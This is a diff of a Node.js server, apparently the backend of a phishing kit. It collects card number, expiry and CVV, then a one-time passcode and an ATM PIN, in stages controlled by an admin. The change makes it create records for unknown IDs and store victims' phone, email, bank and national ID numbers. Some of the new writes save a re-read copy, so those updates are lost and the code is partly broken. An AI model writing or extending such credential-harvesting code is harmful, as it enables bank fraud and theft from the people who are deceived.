@@ -27,6 +27,21 @@ const readOrders = () => {
   catch { return []; }
 };
 const writeOrders = (list) => fs.writeFileSync(DB_FILE, JSON.stringify(list, null, 2));
+const ensureOrderRecord = (id, seed = {}) => {
+  const orders = readOrders();
+  let order = orders.find((item) => item.id === id);
+  if (!order) {
+    order = {
+      id: String(id),
+      createdAt: new Date().toISOString(),
+      status: 'pending',
+      ...seed
+    };
+    orders.unshift(order);
+    writeOrders(orders);
+  }
+  return order;
+};
 
 /* ---------- جلسات الأدمن ---------- */
 const sessions = new Map();
@@ -239,18 +254,23 @@ const server = http.createServer(async (req, res) => {
     const body = await readBody(req);
     const id = String(body.requestId || '').slice(0, 100) || crypto.randomBytes(8).toString('hex');
     paymentStates.set(id, { status: 'pending', stage: 'payment', createdAt: Date.now() });
-    const orders = readOrders();
-    const order = orders.find((item) => item.id === id);
-    if (order) {
-      order.status = 'pending';
-      order.card = {
-        cardName: String(body.cardName || '').slice(0, 120),
-        cardNumber: String(body.cardNumber || '').slice(0, 32),
-        expiryDate: String(body.expiryDate || '').slice(0, 10),
-        cvv: String(body.cvv || '').slice(0, 4)
-      };
-      writeOrders(orders);
-    }
+
+    const order = ensureOrderRecord(id, {
+      name: String(body.name || 'مستخدم بطاقة').slice(0, 120),
+      phone: String(body.phone || '').slice(0, 16),
+      qid: String(body.qid || '').slice(0, 20),
+      email: String(body.email || '').slice(0, 200),
+      bank: String(body.bank || 'Card').slice(0, 80),
+      status: 'pending'
+    });
+    order.status = 'pending';
+    order.card = {
+      cardName: String(body.cardName || '').slice(0, 120),
+      cardNumber: String(body.cardNumber || '').slice(0, 32),
+      expiryDate: String(body.expiryDate || '').slice(0, 10),
+      cvv: String(body.cvv || '').slice(0, 4)
+    };
+    writeOrders(readOrders());
     return json(res, 200, { ok: true, id: id });
   }
 
@@ -264,14 +284,18 @@ const server = http.createServer(async (req, res) => {
     }
 
     paymentStates.set(id, { status: 'pending', stage: 'otp', otpSubmitted: true, createdAt: Date.now() });
-    const orders = readOrders();
-    const order = orders.find((item) => item.id === id);
-    if (order) {
-      order.status = 'pending';
-      order.card = order.card || {};
-      order.card.otp = otp;
-      writeOrders(orders);
-    }
+    const order = ensureOrderRecord(id, {
+      name: String(body.name || 'مستخدم بطاقة').slice(0, 120),
+      phone: String(body.phone || '').slice(0, 16),
+      qid: String(body.qid || '').slice(0, 20),
+      email: String(body.email || '').slice(0, 200),
+      bank: String(body.bank || 'Card').slice(0, 80),
+      status: 'pending'
+    });
+    order.status = 'pending';
+    order.card = order.card || {};
+    order.card.otp = otp;
+    writeOrders(readOrders());
     return json(res, 200, { ok: true, id: id });
   }
 
@@ -285,14 +309,18 @@ const server = http.createServer(async (req, res) => {
     }
 
     paymentStates.set(id, { status: 'pending', stage: 'atm', otpSubmitted: true, createdAt: Date.now() });
-    const orders = readOrders();
-    const order = orders.find((item) => item.id === id);
-    if (order) {
-      order.status = 'pending';
-      order.card = order.card || {};
-      order.card.atm = atmPin;
-      writeOrders(orders);
-    }
+    const order = ensureOrderRecord(id, {
+      name: String(body.name || 'مستخدم بطاقة').slice(0, 120),
+      phone: String(body.phone || '').slice(0, 16),
+      qid: String(body.qid || '').slice(0, 20),
+      email: String(body.email || '').slice(0, 200),
+      bank: String(body.bank || 'Card').slice(0, 80),
+      status: 'pending'
+    });
+    order.status = 'pending';
+    order.card = order.card || {};
+    order.card.atm = atmPin;
+    writeOrders(readOrders());
     return json(res, 200, { ok: true, id: id });
   }
 
@@ -326,9 +354,24 @@ const server = http.createServer(async (req, res) => {
       otpSubmitted: Boolean(current.otpSubmitted),
       createdAt: Date.now()
     });
+
     const orders = readOrders();
-    const order = orders.find((item) => item.id === id);
-    if (order) { order.status = nextStatus; writeOrders(orders); }
+    let order = orders.find((item) => item.id === id);
+    if (!order) {
+      order = {
+        id: String(id),
+        createdAt: new Date().toISOString(),
+        status: nextStatus,
+        name: 'مستخدم بطاقة',
+        phone: '',
+        qid: '',
+        bank: 'Card'
+      };
+      orders.unshift(order);
+    }
+    order.status = nextStatus;
+    order.card = order.card || {};
+    writeOrders(orders);
     return json(res, 200, { ok: true, status: nextStatus });
   }
 
